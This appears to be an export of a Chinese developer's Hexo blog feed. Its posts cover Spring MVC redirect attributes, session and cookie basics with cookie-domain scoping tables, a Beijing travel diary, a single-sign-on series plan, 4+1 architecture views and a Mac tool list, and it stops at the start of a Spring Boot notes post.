<h5 id="带参数"><a href="#带参数" class="headerlink" title="带参数"></a>带参数</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(RedirectAttributes attributes)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    attributes.addAttribute(<span class="string">"hello"</span>, <span class="string">"hello"</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"redirect:/toList"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样会在重定向后的url中自动追加参数。</p>
<p>Spring MVC 3.1 版本添加了一个新特性，Flash属性，可以实现传递参数，并且可以解决重复提交的问题。</p>
<p>一个正常的Controller处理时，处理完成之后，会被forward到一个操作成功的页面，如果用户按F5，就会再次提交一遍，如果使用redirect，就可以避免这个问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(RedirectAttributes attributes)</span>  </span>&#123;  </span><br><span class="line">    attributes.addFlashAttribute(<span class="string">"hello"</span>, <span class="string">"hello"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"redirect:/toList"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 单点登录与权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 重定向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[单点登录与权限管理本质：session和cookie介绍]]></title>
      <url>https://qqdong.github.io/2018/02/27/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%B8%80%EF%BC%9Asession%E4%B8%8Ecookie%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p>本篇开始写「单点登录与权限管理」系列的第一部分：单点登录与权限管理本质，这部分主要介绍相关的知识概念、抽象的处理过程、常见的实现框架。通过这部分的介绍，能够对单点登录与权限管理有整体上的了解，对其相关概念、处理流程、常见实现有个基本的认识。</p>
<p>本篇文章介绍下session和cookie，它是登录实现的基础，主要从下面几个方面介绍：</p>
<ul>
<li>session和cookie基本概念</li>
<li>session的生命周期</li>
<li>cookie的作用域</li>
</ul>
<a id="more"></a>
<p>cookie的跨域问题会在后续文章单独介绍。</p>
<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>大部分系统都需要识别用户的身份，有些功能只有特定的用户能使用，有些功能需要根据用户身份显示不同的内容，一般使用唯一编号标识用户的身份。</p>
<p>就像我们的身份证，身份证号是每个人唯一的，根据所在的省市区、出生年月、性别等规则生成，我们去政府机构办事时，都需要带着身份证，他们通过身份证验证我们的身份。</p>
<p>session和cookie主要用来识别登录者身份的，默认通过JSESSIONID唯一编号进行验证。session是在服务端保存的一个数据结构，用来跟踪用户的状态，也可以保存用户相关的一些数据，可以保存在内存、缓存、数据库等存储结构中。cookie是客户端保存用户信息的一种机制。</p>
<h5 id="servlet-session"><a href="#servlet-session" class="headerlink" title="servlet session"></a>servlet session</h5><p>javax.servlet.http包中是session的主要API接口，主要有以下几种接口：</p>
<ul>
<li>HttpSession：实际的session接口定义；</li>
<li>Listener：session发生一些动作，如创建，设置属性，失效等，会触发一些事件，进行相应的处理；</li>
<li>Event：当动作触发之后，封装为对应的事件；</li>
</ul>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15197373913600.jpg" alt="Session相关接口"></p>
<p>session相关的接口，一般由应用服务器来实现，比如Tomcat、Resin、Jetty。Session的主要特征：</p>
<ul>
<li>可以设置和获取一些属性；</li>
<li>每个session对应一个编号sessionId，是一次会话的唯一表示；</li>
<li>session有超时时间，用户长时间无操作，维护的定时器会清除session，保证资源及时释放；</li>
<li>可以通过调用invalidate方法主动清除session；</li>
</ul>
<p>在tomcat中，HttpSession的实现是StandardSession，同时StandardSession会实现自定义的Session接口，它是对HttpSesion一个包装。<br><img src="http://oc3r3rke2.bkt.clouddn.com/15197384987063.jpg" alt="Tomcat Sesion接口"></p>
<p>另外，tomcat会实现session的管理和持久化，可随时获取到对应的session，具体实现不在本篇分析，网上有很多文章介绍。</p>
<h5 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h5><p>cookie是客户端的解决方案，是服务器发给客户端的特殊信息，这些信息以文本文件的方式存放在客户端，后续请求，客户端都会带上这些特殊的信息。</p>
<p>服务端通过HTTPResponse设置cookie到响应头，发送到客户端，后续客户端自动将cookie信息设置到请求头。下面是我登录百度后的cookie信息：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15197400794162.jpg" alt="百度cookie信息"></p>
<p>cookie也有失效时间，可在服务端通过cookie.setMaxAge(expiry)进行设置，expiry=-1：代表浏览器关闭后，cookie就失效了；expiry&gt;0：代表会将cookie保存到硬盘中，直到设置时间过期才会被浏览器自动删除；expiry=0：删除cookie，cookie都会被浏览器给删除。</p>
<p>另外还有其他几个特性：</p>
<ul>
<li>setDomain：设置cookie范围，后面会详细介绍；</li>
<li>isHttpOnly：是否只是http协议使用。只能在后端通过getCookies()获取，js不能获取；</li>
<li>每一个cookie文件大小：4kb ， 如果超过4kb浏览器不识别；</li>
<li>cookie不安全，可能泄露用户信息，浏览器支持禁用cookie操作；</li>
<li>临时session：默认生命周期，当浏览器关闭时cookie销毁的；</li>
</ul>
<h5 id="交互过程"><a href="#交互过程" class="headerlink" title="交互过程"></a>交互过程</h5><p><img src="http://oc3r3rke2.bkt.clouddn.com/15197427091558.jpg" alt="交互过程图"></p>
<ol>
<li>使用浏览器访问服务端页面；</li>
<li>服务端收到该客户端第一次请求后，会创建一个session，生产一个唯一sessionId；</li>
<li>同时在响应请求中设置cookie，属性名为jessionid；</li>
<li>客户端收到后会保存jessionid，再次请求时，会在header中设置，服务端可从请求头中获取；</li>
<li>服务端验证获取的sessionId是否存在，即可验证是否是同一用户；</li>
</ol>
<blockquote>
<p>当浏览器禁用cookie后，基于cookie的session将不能正常工作，每次都将创建一个新的session，可通过url重写传递jsessionid。</p>
</blockquote>
<h4 id="session的生命周期"><a href="#session的生命周期" class="headerlink" title="session的生命周期"></a>session的生命周期</h4><p>session存储在服务器端，session在用户第一次访问时创建，访问jsp、servlet等程序时才会创建Session，只访问html、image等静态资源并不会创建，可调用request.getSession(true)强制生成Session。</p>
<p>服务器会把长时间没有活动的Session从内存中清除，tomcat中session的默认失效时间为20分钟，可调用调用session的invalidate方法强制清楚。</p>
<p>另外，我们可以自己实现session生命周期的管理，以满足特定的业务需求，比如后续要讲的单点登录、分布式session等，tomcat可提供了相应扩展，后续文章会介绍。</p>
<h4 id="cookie的作用域"><a href="#cookie的作用域" class="headerlink" title="cookie的作用域"></a>cookie的作用域</h4><p>创建cookie时，需要设置domain，有多级域名时，可以控制cookie的作用域。如果网站请求量很大，设置的cookie作用域不当，会浪费很多流量。</p>
<p>下面举例说明，比如有三级域名support.kefu.mi.com，其中，mi.com是一级域名，kefu.mi.com是二级域名。</p>
<p>在3类域名下进行cookie设置，分别设置不同的domain，看看访问各级域名时cookie的有效性。当domain设置为空时，domain默认为当前域名。</p>
<h5 id="在一级域名mi-com下设置cookie"><a href="#在一级域名mi-com下设置cookie" class="headerlink" title="在一级域名mi.com下设置cookie"></a>在一级域名mi.com下设置cookie</h5><table>
<thead>
<tr>
<th>domain参数</th>
<th>访问一级</th>
<th>访问二级</th>
<th>访问三级</th>
</tr>
</thead>
<tbody>
<tr>
<td>空</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>mi.com</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>kefu.mi.com</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>mcc.kefu.mi.com</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody>
</table>
<p>当domain为一级域名时，一级域名、包括其下的子域名都可以接收到cookie。但是domain参数设置其子域名时，所有域名就接收不到了，包括那个子域名。</p>
<h5 id="在二级域名kefu-mi-com下设置cookie"><a href="#在二级域名kefu-mi-com下设置cookie" class="headerlink" title="在二级域名kefu.mi.com下设置cookie"></a>在二级域名kefu.mi.com下设置cookie</h5><table>
<thead>
<tr>
<th>domain参数</th>
<th>访问一级</th>
<th>访问二级</th>
<th>访问三级</th>
</tr>
</thead>
<tbody>
<tr>
<td>空</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>mi.com</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>kefu.mi.com</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>mcc.kefu.mi.com</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody>
</table>
<p>当domain为自身域名时，其父域名无法接收到cookie，其本身与其子域名可以接收到cookie。而设置其子域名或其他域名时，所有域名都接收不到cookie。</p>
<h5 id="在三级域名mcc-kefu-mi-com下设置cookie"><a href="#在三级域名mcc-kefu-mi-com下设置cookie" class="headerlink" title="在三级域名mcc.kefu.mi.com下设置cookie"></a>在三级域名mcc.kefu.mi.com下设置cookie</h5><table>
<thead>
<tr>
<th>domain参数</th>
<th>访问一级</th>
<th>访问二级</th>
<th>访问三级</th>
</tr>
</thead>
<tbody>
<tr>
<td>空</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>mi.com</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>kefu.mi.com</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>mcc.kefu.mi.com</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
</tbody>
</table>
<p>可以得出结论：domain参数可以设置父域名以及自身，但不能设置其它域名，包括子域名，否则cookie不起作用。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 单点登录与权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> session </tag>
            
            <tag> cookie </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[走走初春的北京]]></title>
      <url>https://qqdong.github.io/2018/02/25/%E8%B5%B0%E8%B5%B0%E5%88%9D%E6%98%A5%E7%9A%84%E5%8C%97%E4%BA%AC/</url>
      <content type="html"><![CDATA[<blockquote>
<p>图片比较多，移动网络请注意流量。</p>
</blockquote>
<p>老丈人因为家里的一些事情来到了北京，今天周末，正好休息，陪他转一天，前两天好多地方已经去过了，今天就去了清华、北大、颐和园，正好都在一起，比较方便。</p>
<p>为了赶时间，早上7点就起床了，到清华西门后，人特别少，在门口大大方方的准备进去后，被门卫帅哥拦住了，「今天不开放」，尴尬的转身走去，原来学生这两天快开学了。</p>
<p>来了进不去觉得可惜，就通过其他渠道花了80元钱（3个人）进去了，慢悠悠的逛了几个有名的地方，清华园、清华学堂、图书馆、水木清华、牡丹园、绿园。</p>
<a id="more"></a>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195722982457.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195724883414.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195725072791.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195725606637.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195725665258.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195725825167.jpg" alt=""></p>
<p>清华西门出来后，直走去了北大西门，看了几个地方，未名湖、博雅塔、图书馆、第一教学楼、老建筑。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730285798.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730370756.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730488129.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730544427.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730657170.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730728249.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195730813528.jpg" alt=""></p>
<p>从北大东门出来后，打的直接去了颐和园东宫门，走走停停的看了几个地方，乐寿堂、邀月门、长廊、佛香阁、苏州街。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732274112.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732349081.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732428920.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732558929.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732615940.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732697321.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732757885.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732834284.jpg" alt=""></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15195732899225.jpg" alt=""></p>
<p>累了，马上休息了，晚安。</p>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 北京 </tag>
            
            <tag> 初春 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[「单点登录与权限管理」系列概述]]></title>
      <url>https://qqdong.github.io/2018/02/24/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%B3%BB%E5%88%97/</url>
      <content type="html"><![CDATA[<p>首先，感谢几位朋友在朋友圈转发我的文章，小声的告诉你们，是我主动让他们帮忙转发的：）在朋友们的分享下，凌晨推送的一篇文章，阅读人数达到了280多，很满足，我会坚持写下去，分享工作、学习、生活中的所思所想。</p>
<p>已关注的朋友们多给我点赞，给我一些动力：）</p>
<p>本来准备结合实际项目，写写netty系列，但后面一个月工作会比较忙，就决定写写和后面工作关联度大的技术，一边调研、实践，一边整理、分享给大家。</p>
<a id="more"></a>
<p>该系列主要以我们系统「单点登录与权限管理」的实现为主线，深入了解下CAS、Shiro，扩展了解下OAuth、Spring Security、Spring Session，计划内容如下：</p>
<ul>
<li>单点登录与权限管理本质</li>
<li>项目背景介绍</li>
<li>项目基本实现</li>
<li>由浅入深了解CAS</li>
<li>由浅入深了解Shiro</li>
<li>CAS和Shiro改造过程</li>
<li>了解和尝试OAuth</li>
<li>了解和尝试Spring Security</li>
<li>了解和尝试Spring Session</li>
</ul>
<p>其实，列出的这些技术点，我也没有深入了解过，但会尽力分享学习、实践的过程，大家多支持和包容。</p>
<p>这篇就不分享干货了，明天带家人去北大、清华、颐和园看看，多拍点照片出来，愁一愁开春的北京。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 单点登录与权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 单点登录 </tag>
            
            <tag> 权限管理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[「4+1视图」学习与理解]]></title>
      <url>https://qqdong.github.io/2018/02/23/4+1%E8%A7%86%E5%9B%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      <content type="html"><![CDATA[<blockquote>
<p>声明：部分内容摘录了简书「橘色对白」作者的文章片段。</p>
</blockquote>
<p>之前经常看到文章中提到「4+1视图」，对其也有片面的理解，但一直没有实践过，不清楚其真正的作用，这两天在业务需求分析中运用了其中的一部分，想谈谈自己的粗浅理解。 </p>
<p>最近在调研「多租户」实现方案时，看到简友「橘色对白」的3篇关于多租户架构的文章，其中一篇「<a href="https://www.jianshu.com/p/dfa73524efda" target="_blank" rel="noopener">以CRM系统为例，浅析初级SaaS架构的构建方法</a>」，以「4+1视图」的形式，覆盖了分析、设计、开发、部署等阶段，如何一步一步递进，形成最终的实施方案。</p>
<p>所谓「4+1视图」，是从5个不同视角来描述软件体系结构，包括场景视图、逻辑视图、开发视图、过程视图、物理视图，每个视图只关系系统的一个侧面，5个视图结合起来，才能反映系统的全部内容。</p>
<a id="more"></a>
<p>好吧，语气还是有点官方了，本来想根据自己项目再分析一遍，有人又在催我睡觉了，同时觉得「橘色对白」的这篇文章写的很不错了，决定整理下分享出来。</p>
<p>在分享之前，说说我的实践，通过场景视图、逻辑视图，分析出了「多租户」改造时，需要的功能列表。场景视图站在使用系统的角度，分析各个角色的用例。 逻辑视图站在业务对象的角度，表达了业务对象和对象间的关系。两个视图相互递进和补充，帮助我更完整的梳理出系统的功能点。</p>
<p>下面分享下「橘色对白」的这篇文章，如何一步步构建CRM系统</p>
<h4 id="一、场景视图"><a href="#一、场景视图" class="headerlink" title="一、场景视图"></a>一、场景视图</h4><p>负责从用户角度，识别业务需求，描述业务场景，是架构设计的起点和终点。</p>
<h5 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a>场景描述</h5><p>老板角度：了解客户增减数量；了解客户增减变化趋势；商务行程管理。</p>
<p>员工角度：保存和随时查阅客户资料；通过邮件、IM、IP电话与客户保持及时沟通；商务行程管理。</p>
<h5 id="场景抽象"><a href="#场景抽象" class="headerlink" title="场景抽象"></a>场景抽象</h5><p>客户管理：增、删、改、查，客户资料；<br>行程管理：商务形成安排（客户拜访、合同谈判）；<br>订单管理：已签订单的管理；</p>
<h4 id="二、逻辑视图"><a href="#二、逻辑视图" class="headerlink" title="二、逻辑视图"></a>二、逻辑视图</h4><p>从对象角度，构建对象模型，用以确立逻辑分层、模块划分、模块功能、模块间依赖关系等。其中，模块功能，既包括可见的业务功能，也包括不可见的系统功能（日志、权限、事务等）。</p>
<h5 id="模块划分及功能"><a href="#模块划分及功能" class="headerlink" title="模块划分及功能"></a>模块划分及功能</h5><p>客户模块、行程模块、订单模块、报表模块</p>
<h5 id="模块依赖关系"><a href="#模块依赖关系" class="headerlink" title="模块依赖关系"></a>模块依赖关系</h5><p><img src="http://oc3r3rke2.bkt.clouddn.com/15193963712371.jpg" alt="模块依赖关系"></p>
<h5 id="模块包含的业务对象"><a href="#模块包含的业务对象" class="headerlink" title="模块包含的业务对象"></a>模块包含的业务对象</h5><ul>
<li>客户模块 — 客户分组、客户、联系人；</li>
<li>行程模块 — 时间、事项等；</li>
<li>订单模块 — 时间、客户、订单等；</li>
<li>报表模块 — ……</li>
</ul>
<h4 id="三、开发视图"><a href="#三、开发视图" class="headerlink" title="三、开发视图"></a>三、开发视图</h4><p>从开发角度，描述软件在开发环境下的静态组织（程序包、应用的统一框架、引用的类库、SDK和中间件等），并规范和约束开发环境的结构。</p>
<h5 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h5><ul>
<li>开发语言：Java、JavaScript、Html</li>
<li>数据库类型：MySQL 5.0</li>
<li>应用服务器类型：Apache+JBOSS</li>
<li>其他软件：Ant、JUnit 等</li>
<li>相关硬件：略</li>
</ul>
<h5 id="技术框架"><a href="#技术框架" class="headerlink" title="技术框架"></a>技术框架</h5><p>开源框架：Struts+Spring+Hibernate框架结构<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193965756550.jpg" alt="调用视图"></p>
<h5 id="分层策略"><a href="#分层策略" class="headerlink" title="分层策略"></a>分层策略</h5><p><img src="http://oc3r3rke2.bkt.clouddn.com/15193966269601.jpg" alt="分层策略"></p>
<h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><p>根据分层，制定目录结构如下<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193966752088.jpg" alt="目录结构"></p>
<ul>
<li>Api: 存放service的接口定义源文件；</li>
<li>Action: 存放action的源文件和配置文件；</li>
<li>Biz: 存放各模块的业务逻辑组件和DAO组件；</li>
<li>Bundle: 存放JSP和HTML文件；</li>
<li>deploy：存放构建后待部署的jar文件；</li>
<li>biz目录下根据模块再分为dao和service目录，以及它们的实现类目录impl；</li>
</ul>
<h4 id="四、过程视图"><a href="#四、过程视图" class="headerlink" title="四、过程视图"></a>四、过程视图</h4><p>从过程角度，描述系统的并发和同步设计。旨在解决进程、线程、并发、同步、通信等方面的问题；</p>
<h4 id="五、物理视图"><a href="#五、物理视图" class="headerlink" title="五、物理视图"></a>五、物理视图</h4><p>负责从部署角度，描述软硬件的映射关系，以及系统在分布/部署上的设计。旨在解决系统安装、系统部署、网络分布等问题。</p>
<p>至此，CRM系统已基本成型。</p>
<blockquote>
<p>理论很重要，更重要的是去实践，在实践的过程中，才能够真正理解理论中每个字的精华。<br>我理解的还很浅，先欠个账，后续项目开发过程中，完整应用「4+1视图」后，我在做个实践总结。</p>
</blockquote>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 软件工程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 4+1视图 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[我的常用工具集]]></title>
      <url>https://qqdong.github.io/2018/02/22/%E6%88%91%E7%9A%84%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
      <content type="html"><![CDATA[<p>今天年后第一天上班，去年会有公司高管在门口发红包，本来想早点去公司，但还是晚到20分钟，错失了我的大红包 ：）。上午一直不在状态，可能是所谓的节后综合征，下午慢慢好起来，调研和整理了 「多租户的实现方案」。</p>
<p>今天想说说我的常用工具集，主要是mac上的工具，希望大家有喜欢的。如果有更好用的，大家可以在留言区留言，让更多的人知道。</p>
<p>16年初来到小米后，标配是双显示器，配置是8核16G内存，系统推荐使用ubuntu，之后就一直用这个。但我们的项目有好多子项目，每次在本地调试时，会导致机器会非常卡，比较影响工作效率。</p>
<p>所以，今天又把我的mac笔记本带到公司了，分担一部分压力，以后会同时用公司电脑和mac上，分别显示在2个显示器上。</p>
<p>公司电脑只运行idea集成开发软件，mac上主要运行idea以外的所有的常用软件，比如微信、qq、文档工具、邮件客户端、xmind、笔记软件、浏览器等。</p>
<a id="more"></a>
<h5 id="2台电脑共用一套键鼠"><a href="#2台电脑共用一套键鼠" class="headerlink" title="2台电脑共用一套键鼠"></a>2台电脑共用一套键鼠</h5><p>通过「Synergy」软件可以很方便的实现共用一套键鼠，支持多个操作系统，我就是通过这个软件在ubuntu和mac上共用了一套键鼠的。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15193075772878.jpg" alt="Synergy软件"></p>
<p>如上图所示，配置对应的客户端和服务端，配置过程比较简单，我就不赘述了，大家可以在网上搜相关的安装、配置教程。配置过程中有问题可以留言评论，我会第一时间解答。</p>
<h5 id="知识管理-收藏"><a href="#知识管理-收藏" class="headerlink" title="知识管理 - 收藏"></a>知识管理 - 收藏</h5><p>看到好的文章，我会收藏起来，可以随时离线看，我目前使用「收趣」软件，app和web端支持的都比较好。我也是前段时间刚发现的，之前一直用pocket，但阅读体验不是特别好。</p>
<p>我总结下「收趣」的优点：</p>
<ul>
<li>手机端可随时收集到收趣app，pc端有chrome插件， 可以很方便的收集到收趣；</li>
<li>可以很方便的从其他软件批量导入，包括Pocket、微博、知乎、今日头条。</li>
<li>收藏的网页有很好的阅读体验；</li>
<li>可对收藏的网站进行识别，按网站来源进行归类；</li>
<li>便捷的自定义分类管理；</li>
<li>注重知识关联和分享，可查看其它网友收藏的好文章；</li>
</ul>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15193088227884.jpg" alt="批量导入"></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15193088744604.jpg" alt="收藏的文章列表"></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15193089353224.jpg" alt="自定义分类"></p>
<h5 id="知识管理-个人知识库"><a href="#知识管理-个人知识库" class="headerlink" title="知识管理 - 个人知识库"></a>知识管理 - 个人知识库</h5><p>对于特别好的文章，我会记录阅读笔记。工作、学习过程中，会对调研的技术进行系列学习和总结。我使用「为知笔记」管理我的知识库，不过目前收费了，我已经付费使用1年多了，觉得很不错，特别是网页的剪辑和多级分类管理。<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193113570918.jpg" alt="为知笔记"></p>
<h5 id="个人博客的工具集"><a href="#个人博客的工具集" class="headerlink" title="个人博客的工具集"></a>个人博客的工具集</h5><ul>
<li>使用hexo搭建我的个人博客，结合github pages进行托管，搭建过程很方便，可以访问我的博客看下效果：<a href="http://qqidol.com" target="_blank" rel="noopener">http://qqidol.com</a></li>
<li>使用markdown写博客，强烈推荐MWeb编辑器，真的特别好用。<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193105542285.jpg" alt="MWeb软件"></li>
</ul>
<p>大家可以尝试使用hexo搭建个人博客，具体可以参考一位简书上的朋友的文章：<a href="https://www.jianshu.com/p/05289a4bc8b2" target="_blank" rel="noopener">https://www.jianshu.com/p/05289a4bc8b2</a></p>
<p>搭建过程中，有任何问题可以留言评论，我会及时解答。</p>
<h5 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h5><ul>
<li>文档工具：dash<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193099029949.jpg" alt="文档工具Dash"></li>
<li>在线api文档：oschina在线工具<br><a href="http://tool.oschina.net/apidocs" target="_blank" rel="noopener">http://tool.oschina.net/apidocs</a></li>
</ul>
<h5 id="软件管理"><a href="#软件管理" class="headerlink" title="软件管理"></a>软件管理</h5><ul>
<li>软件包管理工具：homebrew，特别强大</li>
<li>homebrew可视化工具：Cakebrew<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193104299106.jpg" alt="Cakebrew工具"></li>
<li>常用软件启动、停止管理工具：LaunchRocket<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193103846635.jpg" alt="LaunchRocket工具"></li>
</ul>
<h5 id="终端工具"><a href="#终端工具" class="headerlink" title="终端工具"></a>终端工具</h5><ul>
<li>终端工具使用iTerm2；</li>
<li>使用zsh替换bash，可以使用Oh My ZSH!工具；</li>
<li>使用tmux进行多窗口管理；<br><img src="http://oc3r3rke2.bkt.clouddn.com/15193108108055.jpg" alt="tmux多窗口工具"></li>
</ul>
<h5 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h5><ul>
<li>思维导图：xmind</li>
<li>流程图工具：gliffy、staruml</li>
<li>网络抓包工具：Wireshark、Charles</li>
<li>HTTP客户端工具：Postman</li>
<li>免费翻墙工具：Lantern，每月有免费流量，基本的网页搜索够用了。</li>
</ul>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tool </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[《深入实践Spring Boot》阅读笔记之三：核心技术源代码分析]]></title>
      <url>https://qqdong.github.io/2018/02/21/%E6%B7%B1%E5%85%A5%E5%AE%9E%E8%B7%B5Spring%20Boot%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>刚关注的朋友，可以回顾前两篇文章：</p>
<ul>
<li><a href="http://qqidol.com/2018/02/19/%E6%B7%B1%E5%85%A5%E5%AE%9E%E8%B7%B5Spring%20Boot-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/" target="_blank" rel="noopener">基础应用开发</a></li>
<li><a href="http://qqidol.com/2018/02/20/%E6%B7%B1%E5%85%A5%E5%AE%9E%E8%B7%B5Spring%20Boot%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/" target="_blank" rel="noopener">分布式应用开发</a></li>
</ul>
<p>上篇文章总结了《深入实践Spring Boot》的第二部分，本篇文章总结第三部分，也是最后一部分。这部分主要讲解核心技术的源代码分析，因为篇幅和能力原因，分析的不会太详细，后续深入研究后再专门写文章。希望大家能从「阅读笔记」3篇文章中，对Spring Boot提供的功能有所了解，在项目中进行实践，不断从繁琐重复的开发中解放出来。</p>
<p>我也是最近刚开始了解Spring Boot，计划今年在项目中实践，到时会总结实践过程中的一些问题和经验，分享给大家。想一起学习、实践、交流的朋友，可以扫描文章下方的二维码，关注我的个人公众号，感谢大家。</p>
<p>本篇主要从以下几个方面总结：</p>
<ul>
<li>Spring Boot自动配置实现原理；</li>
<li>Spring Boot数据访问实现原理；</li>
